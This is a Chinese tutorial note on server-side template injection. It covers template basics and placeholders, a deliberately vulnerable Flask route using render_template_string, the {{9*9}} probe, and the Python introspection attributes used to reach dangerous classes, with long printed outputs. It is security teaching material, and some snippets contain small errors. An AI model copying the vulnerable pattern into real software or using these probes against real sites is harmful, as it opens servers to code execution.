---
description: 全称服务器模块注入，说实话我之前都不知道什么叫模板，所以这个漏洞我一直不是很想写。因为我完全不知道是什么东西。
---

# 🔔 SSTI知识点总结

## 一.模板是什么

先给大家上一张图，总体来看就能知道是什么。

<figure><img src="../.gitbook/assets/image (196).png" alt=""><figcaption><p>从hello-ctf顺来的，我认为应该放在前面让大家建立总体的框架。</p></figcaption></figure>

我们接下来将一一解释里面的一些概念。

### ①静态文本和动态文本

静态文本：仅仅用来展示，不能动态改变其内容，也不能再在文本框输入文字。一般是html这种文本

动态文本：可动态改变文本框的内容，常用于储存变量，随着变量值的改变，文本框的内容也会随之改变，这种类型文本框也不能再在运行时输入文字。一般是php，jsp这种文本。



### ②占位符

占位符就是字符串中的特殊标记，用于在字符串中留出位置，并在运行时将实际的值填充到这些位置上。

这里介绍一些常见的占位符用法。

### <mark style="color:blue;">python:</mark>

#### Ⅰ.%

```python
name = "john"
age = 30
message = "My name is %s and I am %d years old" %(name,age)
print(message)
```

上述的%s是以恶搞占位符，表示字符串类型的值，%d是一个占位符，表示整数的值。通过在字符串末尾使用%运算符和一个元组，可以将实际的值填充到占位符位置。



#### Ⅱ.{}和f-string（格式化字符串字面值）



```python
name = "john"
age = 30
message = f"My name is {name} and I am {age} years old."
print(message)
```

这个地方大括号作为占位符{},并且在字符串面前加上f标记，创建一个f-string，在f-string中，可以直接在花括号中使用变量名，变量的值将自动填充到占位符的位置上。



### <mark style="color:blue;">java</mark>

#### Ⅰ.%d,%f,%b,%s

就是我们常用的各种占位符，我们只介绍一个例子了，毕竟其他是一样的。



```java
String name = "Kristen";
String str = String.format("Hello, %s!",name);
System.out.println(str);
```



### <mark style="color:blue;">php</mark>

#### Ⅰ.双引号字符串中的变量插入

```php
$name="john";
echo "My name is $name";
```

#### Ⅱ.单引号字符串中使用.连接符

```php
$name = "john";
echo ' My name is' . $name . '.';
```

#### Ⅲ.使用花括号包裹变量名

```php
$count =5;
echo “ There are {$count} apples";
```

#### Ⅳ.使用数组下标或对象属性

```php
$fruits=['apple','banana','orange'];
echo " I like {$fruits[0]}.";
```

#### Ⅴ.使用特殊的占位符

```php
$name = "john";
$age = 30;
echo sprintf(" My name is %s and I am %d years old",$name,%age);

```



### ③模板

&#x20;是一种用于生成动态内容的工具。

它们通常包含两个基本部分：静态内容和动态占位符。

我们这里也直接贴图让大家理解了。

**绿色** 部分为 **静态内容** ，而 **橙色** 部分则是 **动态占位符**

<figure><img src="../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

### ④模板引擎



模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的文档。个人的理解模板的诞生是为了将显示与数据分离，其本质是将模板文件和数据通过模板引擎生成最终的HTML代码（如图）

<figure><img src="../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>



### ⑤具体例子实验

这里提供一个模板的例子。

```html
<!--login.tpl-->
<html>
    <head>
        <title>{{title}}</title>
    </head>
    <body>
        <form method="{{method}}",action={{action}}>
            <input type="text" name="user" value="{{username}}">
        </form>
        <p>
            This page took {{microtime(true) - time}} seconds to render.
        </p>
    </body>
</html>
```

对应的后端的代码逻辑可以说

```php
$templateEngine = new TemplateEngine();
$tpl = $templateEngine->loadFile(login.tpl);
$tpl->assign('title','Login');
$tpl->assign('method','post');
$tpl->assign('action','login.php');
$tpl->assign('username',getUserNameFromCookie());
$tpl->assign('time',microtime(true));
$tmp->show();
```







***

## 二.SSTI漏洞原理

### ①原理

也是基于一切输入都是有害的。

目前我们使用二一些框架比如说python的flask，php的tp，java的spring等一般都采用成熟的MVC模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给Vier视图层，经过模版渲染展示给 用户。

那么形成漏洞是因为服务器端接受了用户的恶意输入后，没有经过任何处理就将其作为应用模板的一部分，模板引擎在渲染的时候，执行了用户插入的可以破坏模板的语句（就是和RCE执行漏洞差不多的语句），就可以有敏感信息泄露，代码执行，Getshell等问题。

### ②模板类型

#### <mark style="color:blue;">python：</mark>

* jinja2
* mako
* tornado
* django

#### <mark style="color:blue;">php：</mark>

* smarty
* twig

#### <mark style="color:blue;">java：</mark>

* jade
* velocity

这里有一些触发语法。

<figure><img src="../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

举个栗子，比如：

```python
from flask import Flask
from flask import request
from flask import render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    template = '''
    <p>Hello %s </p>''' % (request.args.get('name'))
    return render_template_string(template)

if __name__ == '__main__':

    app.run()
```

当我们传入\{{9\*9\}}时，他会帮我们运算后输出81。我们就可以把这个9\*9替换为其他的执行语句。





***

## 三.python的SSTI注入

我们会先介绍一些常用函数，常用类之类的基本再来讲解主要的ssti注入。

### ①常用函数

#### Ⅰ.\_\_class\_\_

> 用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。是类的一个内置属性，表示类的类型；也是类的实例的属性，表示实例对象的类

```python
print(''.__class__)
print([].__class__)
print(().__class__)
print({}.__class__)
```

<figure><img src="../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

#### Ⅱ.\_\_base\_\_:



> 用来查看类的基类，也可以使用数组索引来查看特定位置的值，通过该属性可以查看该类的所有直接父类，该属性返回所有父类组成的元组，注意是直接父类。

使用语法

```
类名.__base__
```

```python
print([].__class__.__base__)
print(().__class__.__base__)
print({}.__class__.__base__)
```

<figure><img src="../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

#### Ⅲ.\_\_mro\_\_



> 获得这个类的继承调用顺序，同样返回类元组

```python
print(''.__class__.__mro__)
print([].__class__.__mro__)
print(().__class__.__mro__)
print({}.__class__.__mro__)
```

<figure><img src="../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

现在可能还不是特别明显，我们举一个实际点的例子。

```python
class X(object):
    pass
class Y(object):
    pass
class A(X , Y):
    pass
class B(Y):
    pass
class C(A , B):
    pass
print(C.__mro__)
```

<figure><img src="../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

最后的结果展现一下

```
 '__main__.A'>, <class '__main__.X'>, <class '__main__.B'>, <class '__main__.Y'>, <class 'object'>)

```

#### Ⅳ.\_\_subclasses\_\_()



> 查看当前类的子类，即返回object的子类，返回一个列表，等同于object.\_\_subclasses\_\_()。

```python

print(''.__class__.__base__[0].__subclasses__())
print([].__class__.__base__[0].__subclasses__())
print(().__class__.__base__[0].__subclasses__())
print({}.__class__.__base__[0].__subclasses__())

class X(object):
    pass
class Y(object):
    pass
class A(X , Y):
    pass
class B(Y):
    pass
class C(A , B):
    pass
print(C.__bases__[0].__subclasses__())


```

<figure><img src="../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

把结果打印出来看看

```
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'weakref'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'nt.ScandirIterator'>, <class 'nt.DirEntry'>, <class 'PyHKEY'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class 'os._AddedDllDirectory'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_multibytecodec.MultibyteCodec'>, <class '_multibytecodec.MultibyteIncrementalEncoder'>, <class '_multibytecodec.MultibyteIncrementalDecoder'>, <class '_multibytecodec.MultibyteStreamReader'>, <class '_multibytecodec.MultibyteStreamWriter'>, <class '__future__._Feature'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class '_virtualenv._Finder'>]
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'weakref'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'nt.ScandirIterator'>, <class 'nt.DirEntry'>, <class 'PyHKEY'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class 'os._AddedDllDirectory'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_multibytecodec.MultibyteCodec'>, <class '_multibytecodec.MultibyteIncrementalEncoder'>, <class '_multibytecodec.MultibyteIncrementalDecoder'>, <class '_multibytecodec.MultibyteStreamReader'>, <class '_multibytecodec.MultibyteStreamWriter'>, <class '__future__._Feature'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class '_virtualenv._Finder'>]
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'weakref'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'nt.ScandirIterator'>, <class 'nt.DirEntry'>, <class 'PyHKEY'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class 'os._AddedDllDirectory'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_multibytecodec.MultibyteCodec'>, <class '_multibytecodec.MultibyteIncrementalEncoder'>, <class '_multibytecodec.MultibyteIncrementalDecoder'>, <class '_multibytecodec.MultibyteStreamReader'>, <class '_multibytecodec.MultibyteStreamWriter'>, <class '__future__._Feature'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class '_virtualenv._Finder'>]
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'weakref'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'nt.ScandirIterator'>, <class 'nt.DirEntry'>, <class 'PyHKEY'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class 'os._AddedDllDirectory'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_multibytecodec.MultibyteCodec'>, <class '_multibytecodec.MultibyteIncrementalEncoder'>, <class '_multibytecodec.MultibyteIncrementalDecoder'>, <class '_multibytecodec.MultibyteStreamReader'>, <class '_multibytecodec.MultibyteStreamWriter'>, <class '__future__._Feature'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class '_virtualenv._Finder'>]
[<class '__main__.C'>]

```



#### Ⅴ.\_\_import\_\_():



> 函数用于动态加载类和函数，如果一个模块经常变化，就可以使用\_\_import\_\_()来载入，就是import

常用语法&#x20;

```
__import__(name模块名）
```

这里我们需要用到两个python文件，在同一目录下我们建立两个python文件。

